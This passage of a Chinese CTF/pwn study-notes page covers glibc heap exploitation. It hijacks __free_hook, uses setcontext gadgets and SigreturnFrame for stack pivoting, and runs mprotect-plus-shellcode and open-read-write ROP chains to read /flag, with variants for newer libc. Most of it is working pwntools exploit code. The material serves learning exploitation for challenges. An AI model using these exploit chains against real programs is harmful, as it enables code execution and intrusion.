<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-assembly data-lang=assembly>; setcontext.S
movq	oFPREGS(%rdx), %rcx
fldenv	(%rcx)</code></pre></div><p><strong>构造利用</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 劫持__free_hook为chunk0</span>
</span></span><span class=line><span class=cl><span class=n>buf_addr</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x100</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;setcontext&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>read_rop</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>puts_rop</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x100</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;/flag</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit_chunk</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>=</span> <span class=n>SigreturnFrame</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsp</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;open&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdi</span> <span class=o>=</span> <span class=n>buf_addr</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsi</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=c1># 修改fpregs指向一段可读写内存</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=p>[</span><span class=s1>&#39;&amp;fpstate&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>+</span> <span class=n>offset</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>frame</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit_chunk</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>frame</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete_chunk</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span></span></span></code></pre></div></div><h2 id=setcontext>setcontext</h2><ul><li>setcontext 是 libc 中函数，根据传入的 SigreturnFrame 结构指针中内容设置寄存器</li><li>setcontext + offset 位置有 gadget，设置 rdi 为 SigreturnFrame 结构体指针，跳转到 gadget 可将除 rax 外寄存器设置成对应值</li><li><strong>free hook 写入 gadget，free 一个存储 SigreturnFrameFrame 结构内存来设置寄存器，控制程序流程来执行 shellcode 进一步 rop</strong></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-assembly"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-assembly data-lang=assembly>0x7f4b45a35a75 &lt;setcontext+53&gt;     mov    rsp, qword ptr [rdi + 0xa0]
0x7f4b45a35a7c &lt;setcontext+60&gt;     mov    rbx, qword ptr [rdi + 0x80]
0x7f4b45a35a83 &lt;setcontext+67&gt;     mov    rbp, qword ptr [rdi + 0x78]
0x7f4b45a35a87 &lt;setcontext+71&gt;     mov    r12, qword ptr [rdi + 0x48]
0x7f4b45a35a8b &lt;setcontext+75&gt;     mov    r13, qword ptr [rdi + 0x50]
0x7f4b45a35a8f &lt;setcontext+79&gt;     mov    r14, qword ptr [rdi + 0x58]
0x7f4b45a35a93 &lt;setcontext+83&gt;     mov    r15, qword ptr [rdi + 0x60]
0x7f4b45a35a97 &lt;setcontext+87&gt;     mov    rcx, qword ptr [rdi + 0xa8]
0x7f4b45a35a9e &lt;setcontext+94&gt;     push   rcx
0x7f4b45a35a9f &lt;setcontext+95&gt;     mov    rsi, qword ptr [rdi + 0x70]
0x7f4b45a35aa3 &lt;setcontext+99&gt;     mov    rdx, qword ptr [rdi + 0x88]
0x7f4b45a35aaa &lt;setcontext+106&gt;    mov    rcx, qword ptr [rdi + 0x98]
0x7f4b45a35ab1 &lt;setcontext+113&gt;    mov    r8, qword ptr [rdi + 0x28]
0x7f4b45a35ab5 &lt;setcontext+117&gt;    mov    r9, qword ptr [rdi + 0x30]
0x7f4b45a35ab9 &lt;setcontext+121&gt;    mov    rdi, qword ptr [rdi + 0x68]
0x7f4b45a35abd &lt;setcontext+125&gt;    xor    eax, eax
0x7f4b45a35abf &lt;setcontext+127&gt;    ret</code></pre></div><h3 id=shellcode>shellcode</h3><ul><li><strong>条件</strong>：堆，开启沙箱不能 execve，需要 orw，能在<code>__free_hook</code>处申请构造大堆块</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20241215223446557.png alt=图片无法加载><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 此时在 __free_hook 处申请了 chunk0</span>
</span></span><span class=line><span class=cl><span class=n>shellcode1</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>        xor rdi,rdi
</span></span></span><span class=line><span class=cl><span class=s1>        mov rsi,</span><span class=si>%d</span><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>        mov edx,0x1000
</span></span></span><span class=line><span class=cl><span class=s1>        mov eax,0
</span></span></span><span class=line><span class=cl><span class=s1>        syscall		; read(0, free_hook-offset, 0x1000)向__free_hook前某个位置写入shellcode2
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>        jmp rsi		; 跳向shellcode2
</span></span></span><span class=line><span class=cl><span class=s1>        &#39;&#39;&#39;</span> <span class=o>%</span> <span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFF000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 构造chunk0</span>
</span></span><span class=line><span class=cl><span class=n>edit_chunk</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;setcontext&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>53</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcode1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># 构造chunk1: SigreturnFrame</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>=</span> <span class=n>SigreturnFrame</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsp</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;mprotect&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdi</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFF000</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsi</span> <span class=o>=</span> <span class=mh>0x2000</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdx</span> <span class=o>=</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl><span class=n>edit_chunk</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>frame</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># free时setcontext根据frame设置寄存器，更改rsp栈迁移至 &amp;__free_hook+0x8位置</span>
</span></span><span class=line><span class=cl><span class=c1># 结尾ret跳转到rip:mprotect将__free_hook所在内存页添加可执行属性</span>
</span></span><span class=line><span class=cl><span class=c1># 执行完mprotect，ret到shellcode1处执行read，等待向某地址标准输入，之后跳转到该地址</span>
</span></span><span class=line><span class=cl><span class=n>delete_chunk</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 输入shellcode2并执行</span>
</span></span><span class=line><span class=cl><span class=n>shellcode2</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>row_shellcode</span><span class=p>)</span> <span class=c1># ROW</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>shellcode2</span><span class=p>))</span></span></span></code></pre></div></div><h3 id=rop-1>ROP</h3><ul><li>通过 ROP 进行 ORW 操作，调用 free 时执行 setcontext，根据 frame 设置寄存器 ret 到 open 函数打开 flag</li><li>之后依次经过 read 和 puts 打印 flag</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>buf_addr</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x100</span> <span class=c1># /flag地址</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;setcontext&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>53</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=c1># rop</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rsi_ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>buf_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdx_ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_rdi_ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>buf_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x100</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;/flag</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>=</span> <span class=n>SigreturnFrame</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsp</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>8</span> <span class=c1># 劫持到rop</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rip</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;open&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rdi</span> <span class=o>=</span> <span class=n>buf_addr</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=o>.</span><span class=n>rsi</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>frame</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span></span></span></code></pre></div></div><h3 id=new>New</h3><ul><li><p>libc>2.29 新版本，setcontext 改用<code>rdx</code>访问<code>SigreturnFrame</code>来赋值：<code>mov reg, qword ptr [rdx + 0xa0]</code>使得不可直接跳转</p></li><li><p><strong>利用</strong>：泄露堆地址，利用以下 2 种<strong>gadget</strong>之一将释放堆块的内存地址赋值给 rdx，再修改对应 jmp 值跳转到 setcontext 的 gadget</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-assembly"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-assembly data-lang=assembly>; gadget1
mov rdx, [rdi+0x8]
mov rax, [rdi]
mov rdi, rdx
jmp rax</code></pre></div></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-assembly"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-assembly data-lang=assembly>; gadget2
mov rdx, [rdi+0x8]
mov [rsp], rax
call qword ptr[rdx+0x20] # 需要在SigreturnFrame+0x20中覆盖为setcontext+offset地址，不影响赋值操作</code></pre></div></li></ul><p><strong>gadget1</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 已劫持__free_hook到chunk0</span>
</span></span><span class=line><span class=cl><span class=n>payload_addr</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>buf_addr</span> <span class=o>=</span> <span class=n>payload_addr</span> <span class=o>+</span> <span class=mh>0x100</span>
</span></span><span class=line><span class=cl><span class=n>frame_addr</span> <span class=o>=</span> <span class=n>buf_addr</span> <span class=o>+</span> <span class=mh>0x20</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>=</span> <span class=o>...</span> <span class=c1># 构造frame与ROP部分相同</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=s1>&#39;mov rdx, [rdi+0x8]; mov rax, [rdi]; mov rdi, rdx; jmp rax;&#39;</span><span class=p>),</span> <span class=n>executable</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span><span class=o>.</span><span class=fm>__next__</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=c1># 同ROP部分</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>read_gadget</span> <span class=c1># read(3, buf_addr, 0x100)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>puts_gadget</span> <span class=c1># puts(buf_addr)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x100</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;/flag</span><span class=se>\x00</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=n>frame_addr</span> <span class=o>-</span> <span class=n>payload_addr</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>frame</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit_chunk</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit_chunk</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;setcontext&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=n>offset</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>frame_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>delete_chunk</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20241219201658648.png alt=图片无法加载><p><strong>gadget2</strong></p><p>在 gadget1 基础上修改</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 修改payload中为gadget2</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=s1>&#39;mov rdx, [rdi+0x8]; mov [rsp], rax; call qword ptr [rdx+0x20];&#39;</span><span class=p>),</span> <span class=n>executable</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span><span class=o>.</span><span class=fm>__next__</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=c1># frame中+0x20偏移处需要修改为setcontext+offset地址</span>
</span></span><span class=line><span class=cl><span class=n>frame</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>frame</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>frame</span><span class=p>[</span><span class=mh>0x20</span><span class=p>:</span><span class=mh>0x20</span> <span class=o>+</span> <span class=mi>8</span><span class=p>]</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;setcontext&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>53</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># chunk1中arg1可直接填充</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mi>8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>frame_addr</span><span class=p>))</span></span></span></code></pre></div></div><p><strong>setcontext 平替</strong></p><ul><li><code>rdi</code>控制<code>rbp</code>，进而控制<code>rax</code>并执行跳转，在<code>rax + 0x28</code>的位置设置<code>leave; ret</code>完成栈迁移</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// 同时完成程序执行流劫持和栈迁移, 不同libc使用寄存器不同，有些为rbx而非rbp
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>&lt;</span><span class=n>svcudp_reply</span><span class=o>+</span><span class=mi>22</span><span class=o>&gt;:</span>    <span class=n>mov</span>    <span class=n>rbp</span><span class=p>,</span><span class=n>QWORD</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rdi</span><span class=o>+</span><span class=mh>0x48</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>svcudp_reply</span><span class=o>+</span><span class=mi>26</span><span class=o>&gt;:</span>    <span class=n>mov</span>    <span class=n>rax</span><span class=p>,</span><span class=n>QWORD</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rbp</span><span class=o>+</span><span class=mh>0x18</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>svcudp_reply</span><span class=o>+</span><span class=mi>30</span><span class=o>&gt;:</span>    <span class=n>lea</span>    <span class=n>r12</span><span class=p>,[</span><span class=n>rbp</span><span class=o>+</span><span class=mh>0x10</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>svcudp_reply</span><span class=o>+</span><span class=mi>34</span><span class=o>&gt;:</span>    <span class=n>mov</span>    <span class=n>DWORD</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rbp</span><span class=o>+</span><span class=mh>0x10</span><span class=p>],</span><span class=mh>0x0</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>svcudp_reply</span><span class=o>+</span><span class=mi>41</span><span class=o>&gt;:</span>    <span class=n>mov</span>    <span class=n>rdi</span><span class=p>,</span><span class=n>r12</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>svcudp_reply</span><span class=o>+</span><span class=mi>44</span><span class=o>&gt;:</span>    <span class=n>call</span>   <span class=n>QWORD</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rax</span><span class=o>+</span><span class=mh>0x28</span><span class=p>]</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20241219210148601.png alt=图片无法加载><ul><li><p>构造 chunk0 中内容的 payload 为</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;svcudp_reply&#39;</span><span class=p>]</span><span class=o>+</span><span class=mi>22</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>pop_r14_pop_r15_ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rax_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>open_rop</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>read_rop</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>write_rop</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># ljust到0x100</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;b&#39;</span><span class=o>*</span><span class=mh>0x28</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>leave_ret_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># ljust到0x100</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;/flag</span><span class=se>\x00</span><span class=s1>&#39;</span></span></span></code></pre></div></div></li><li><p>构造 chunk1 内容为</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
